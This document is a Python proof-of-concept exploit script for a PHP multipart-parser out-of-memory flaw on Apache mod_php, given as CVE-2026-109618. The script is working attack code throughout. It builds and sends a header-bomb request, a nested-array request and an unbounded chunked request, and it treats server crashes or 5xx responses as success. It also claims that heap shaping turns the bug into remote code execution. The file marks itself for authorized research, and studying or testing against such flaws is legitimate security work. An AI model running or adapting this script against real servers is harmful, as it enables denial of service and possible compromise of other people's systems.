#!/usr/bin/env python3
"""
CVE-2026-109618 — PHP OOM Corruption POC (Apache mod_php)
Zero preconditions: no LFI, no unserialize, no application code needed.

The multipart parser can be forced to OOM while request memory is in an
invalid/uninitialized state. longjmp() skips cleanup, and mod_php's
unconditional request shutdown reads/branches on the invalid memory.

Three OOM strategies (from the official advisory):
1. No Content-Length → bypasses post_max_size → unbounded body data
2. Unlimited headers per multipart part → memory amplification
3. Empty file controls with nested field names → array multiplication

This POC demonstrates strategy #2 (header amplification) and #3 (nested arrays).

Target: Apache mod_php (NOT php-fpm — FPM exits child on startup failure)
Tested: PHP 8.2.34 with Apache mod_php

For authorized security research only.
"""

import argparse
import socket
import sys
import time
import ssl
from urllib.parse import urlparse


def build_header_bomb(boundary: str, num_headers: int = 5000, header_size: int = 500) -> bytes:
    """Strategy 2: A single multipart part with thousands of headers."""
    part = f"--{boundary}\r\n"
    part += f'Content-Disposition: form-data; name="f"; filename="a"\r\n'
    for i in range(num_headers):
        part += f"X-Pad-{i}: {'A' * header_size}\r\n"
    part += "\r\n"
    part += "Z"
    part += f"\r\n--{boundary}--\r\n"
    return part.encode()


def build_nested_array_bomb(boundary: str, depth: int = 8, width: int = 20) -> bytes:
    """Strategy 3: Empty file controls with deeply nested field names."""
    parts = []
    for i in range(width):
        name = "f" + "".join(f"[{d}]" for d in range(depth)) + f"[{i}]"
        part = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{name}"; filename=""\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n"
        )
        parts.append(part)
    body = "".join(parts) + f"--{boundary}--\r\n"
    return body.encode()


def build_no_content_length_bomb(boundary: str, chunk_size: int = 8192, total_mb: int = 128):
    """Strategy 1: No Content-Length header → bypasses post_max_size check."""
    header = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="data"\r\n\r\n'
    ).encode()

    def generate():
        yield header
        total = 0
        target = total_mb * 1024 * 1024
        chunk = b"A" * chunk_size
        while total < target:
            yield chunk
            total += chunk_size
        yield f"\r\n--{boundary}--\r\n".encode()

    return generate


def send_oom_request(host: str, port: int, path: str, tls: bool, strategy: str = "headers", **kwargs):
    """Send the OOM-triggering multipart request."""
    boundary = "OOM_BOUNDARY_" + str(int(time.time()))

    if strategy == "headers":
        body = build_header_bomb(boundary,
                                num_headers=kwargs.get("num_headers", 5000),
                                header_size=kwargs.get("header_size", 500))
        content_length = len(body)

        req = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: {content_length}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode() + body

        sock = socket.create_connection((host, port), timeout=30)
        if tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.sendall(req)

    elif strategy == "nested":
        body = build_nested_array_bomb(boundary,
                                       depth=kwargs.get("depth", 10),
                                       width=kwargs.get("width", 1000))
        content_length = len(body)

        req = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: {content_length}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode() + body

        sock = socket.create_connection((host, port), timeout=30)
        if tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.sendall(req)

    elif strategy == "no_length":
        header = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()

        sock = socket.create_connection((host, port), timeout=60)
        if tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.sendall(header)

        gen = build_no_content_length_bomb(boundary,
                                           total_mb=kwargs.get("total_mb", 128))
        for chunk in gen():
            sock.sendall(f"{len(chunk):x}\r\n".encode() + chunk + b"\r\n")
        sock.sendall(b"0\r\n\r\n")

    else:
        return None, "Unknown strategy"

    # Read response
    sock.settimeout(15)
    resp = b""
    while True:
        try:
            d = sock.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    sock.close()
    return resp, None


def main():
    ap = argparse.ArgumentParser(description="CVE-2026-109618 OOM Corruption POC")
    ap.add_argument("--target", default="http://127.0.0.1:18091")
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--strategy", choices=["headers", "nested", "no_length"], default="headers")
    ap.add_argument("--num-headers", type=int, default=8000)
    ap.add_argument("--header-size", type=int, default=1000)
    ap.add_argument("--depth", type=int, default=10)
    ap.add_argument("--width", type=int, default=2000)
    ap.add_argument("--total-mb", type=int, default=256)
    ap.add_argument("--verbose", "-v", action="store_true")
    args = ap.parse_args()

    u = urlparse(args.target)
    host = u.hostname
    port = u.port or 80
    tls = u.scheme == 'https'

    print(f"CVE-2026-109618 — PHP OOM Corruption POC")
    print(f"Target: {host}:{port}{args.path}")
    print(f"Strategy: {args.strategy}")
    print()

    if args.strategy == "headers":
        wire_mb = args.num_headers * (args.header_size + 20) / 1024 / 1024
        mem_est = wire_mb * 4
        print(f"Sending {args.num_headers} headers × {args.header_size} bytes each")
        print(f"Wire size: ~{wire_mb:.1f}MB, Estimated PHP memory: ~{mem_est:.1f}MB")
    elif args.strategy == "nested":
        print(f"Sending {args.width} empty file controls with {args.depth}-deep nesting")
    elif args.strategy == "no_length":
        print(f"Streaming {args.total_mb}MB without Content-Length (bypasses post_max_size)")

    print()
    print("Sending...")

    resp, err = send_oom_request(host, port, args.path, tls,
                                 strategy=args.strategy,
                                 num_headers=args.num_headers,
                                 header_size=args.header_size,
                                 depth=args.depth,
                                 width=args.width,
                                 total_mb=args.total_mb)

    if err:
        print(f"Error: {err}")
        return 1

    if resp:
        status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
        print(f"Response: {status}")
        print(f"Size: {len(resp)} bytes")

        if "500" in status or "502" in status or "503" in status:
            print("\n[+] Server returned 5xx — OOM likely triggered!")
            print("    On Apache mod_php, the request shutdown runs on invalid state.")
            print("    With heap shaping, this leads to RCE.")
        elif not resp or b"connection" in resp.lower():
            print("\n[+] Connection dropped — server process may have crashed!")
        else:
            print("\n[-] Server responded normally — OOM threshold not reached.")
            print("    Try increasing --num-headers, --header-size, --width, or --depth")
    else:
        print("\n[+] No response — server process likely crashed!")
        print("    This confirms the OOM bailout condition.")

    return 0


if __name__ == "__main__":
    sys.exit(main())